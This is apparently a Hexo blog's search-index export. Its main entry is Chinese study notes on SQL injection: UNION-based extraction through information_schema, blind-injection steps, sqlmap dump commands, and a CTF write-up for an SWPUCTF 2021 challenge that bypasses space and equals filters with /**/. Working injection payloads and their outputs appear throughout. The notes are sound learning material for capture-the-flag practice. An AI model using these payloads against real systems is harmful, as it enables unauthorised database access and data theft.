title="字符型注入的sql语句"></a>字符型注入的sql语句</h3><p>一般形式：<code>select * where name = &#39;用户名的具体值&#39;</code></p><ul><li>加单引号<code>&#39;select * from 【表名】 where name =&#39;用户名具体值&#39; and 1=1 #&#39;</code></li></ul><p>回显正常则判断此处为字符型注入。</p><ol><li><h3 id="判断字段数"><a href="#判断字段数" class="headerlink" title="判断字段数"></a>判断字段数</h3></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">order by x(x为数字)</span><br></pre></td></tr></table></figure><p>从1开始增加，知道返回错误信息，就找到字段数（x-1）</p><ol><li><h3 id="获取数据库信息"><a href="#获取数据库信息" class="headerlink" title="获取数据库信息"></a>获取数据库信息</h3></li></ol><p>使用union select语句来联合查询其他表的数据。例如，假设已经确定字段数为 3，输入’ union select 1,2,3–，观察页面返回结果，确定哪些字段可以显示数据。</p><p>通过替换union select语句中的数字为数据库函数，如database()、version()等，获取数据库的名称</p><p>另：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and 1=2 union select 1,database()</span><br></pre></td></tr></table></figure><p>从而得到数据库名</p><ol><li><h3 id="爆表名和列名"><a href="#爆表名和列名" class="headerlink" title="爆表名和列名"></a>爆表名和列名</h3></li></ol><p>使用<code>information_schema</code>数据库中的<code>tables</code>表和<code>columns</code>表来获取目标数据库中的表名和列名。例如，输入<code>&#39; union select 1,table_name,3 from information_schema.tables where table_schema=database()--</code>，可以获取当前数据库中的所有表名；</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; union select 1, column_name, 3 from information_schema.columns where table_schema =database() AND table_name = &#x27;目标表名&#x27; --+</span><br></pre></td></tr></table></figure><p>table_name是目标表名</p><p>我们假设上面的数据库名称为sqli</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and 1=2 union select 1,group_concat(table_name)from information_schema.tables where table_schema=&#x27;sqli&#x27;</span><br></pre></td></tr></table></figure><ol><li><h3 id="爆字段内容"><a href="#爆字段内容" class="headerlink" title="爆字段内容"></a>爆字段内容</h3></li></ol><p>假设我们需要爆的字段是flag，则有</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and 1=2 union select 1,group_concat(flag) from sqli.flag</span><br></pre></td></tr></table></figure><h1 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h1><p>页面没有回显字段，不显示查询到的结果，只是返回是否查询成功（返回查询语句的布尔值），这种情况一般比较复杂，需要不断尝试</p><h2 id="思路："><a href="#思路：" class="headerlink" title="思路："></a>思路：</h2><ol><li>爆库名长度</li><li>根据库名长度爆库名</li><li>对当前库爆表数量</li><li>根据库名和表数量爆表名长度</li><li>根据表名长度爆表名</li><li>对表爆列数量</li><li>根据表名和列数量爆列名长度</li><li>根据列名长度爆列名</li><li>根据列名爆数据值</li></ol><p>这种情况也可以直接利用脚本来解决</p><p>没有看到比较典型的，还是做题的时候现找吧</p><p>时间运行可能会比较久</p><h1 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h1><p>当注入条件为真时，反应时间会比较长，利用这个点，找到那个真的注入条件，但显然，这个做法会很慢，耽误很长时间。</p><p>在比较简单的题目中，我们倒是可以利用这个点来进行操作</p><h2 id="步骤："><a href="#步骤：" class="headerlink" title="步骤："></a>步骤：</h2><ol><li>确定注入点</li><li>构造延时查询</li><li>观察响应时间</li><li>逐步猜解信息</li></ol><p>另外可以利用sqlmap进行解题，这个方法比较简单</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;URL&quot;</span> --dbs</span><br><span class="line">sqlmap -u <span class="string">&quot;URL&quot;</span> -D sqli --tables</span><br><span class="line">sqlmap -u <span class="string">&quot;URL&quot;</span> -D sqli -T flag --columns --dump</span><br></pre></td></tr></table></figure><p>另外利用python脚本</p><p>依旧是根据题目来写</p><h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><h2 id="SWPUCTF-2021-新生赛-sql"><a href="#SWPUCTF-2021-新生赛-sql" class="headerlink" title="[SWPUCTF 2021 新生赛]sql"></a>[SWPUCTF 2021 新生赛]sql</h2><p><img src="/../images/week2-web-SQL.assets/1746617451387-26.png" alt="img"></p><p>我们先进行测试</p><p><img src="/../images/week2-web-SQL.assets/1746617451382-21.png" alt="img"></p><p><img src="/../images/week2-web-SQL.assets/1746617451382-22.png" alt="img"></p><p>在后面我们发现是有空格过滤和等号过滤的，我们用&#x2F;**&#x2F; 代替空格</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?wllm=-1&#x27;union/**/select/**/1,2,group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema/**/like/**/&#x27;test_db&#x27;%23</span><br><span class="line">LTLT_flag,users</span><br></pre></td></tr></table></figure><p>获得表名</p><p><img src="/../images/week2-web-SQL.assets/1746617451382-23.png" alt="img"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?wllm=-1&#x27;union/**/select/**/1,2,group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_schema/**/like/**/&#x27;test_db&#x27;%23</span><br><span class="line">id,flag,id,username</span><br></pre></td></tr></table></figure><p>得到列名</p><p><img src="/../images/week2-web-SQL.assets/1746617451382-24.png" alt="img"></p><p>最后获取flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?wllm=-1&#x27;union/**/select/**/1,2,group_concat(flag)/**/from/**/test_db.LTLT_flag%23    //%23是#的URL编码，注释掉原始查询的剩余部分</span><br></pre></td></tr></table></figure><p><img src="/../images/week2-web-SQL.assets/1746617451382-25.png" alt="img"></p><p>获得flag</p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>categories</title>
      <link href="/2025/04/27/categories/"/>
      <url>/2025/04/27/categories/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2025/04/26/hello-world/"/>
      <url>/2025/04/26/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
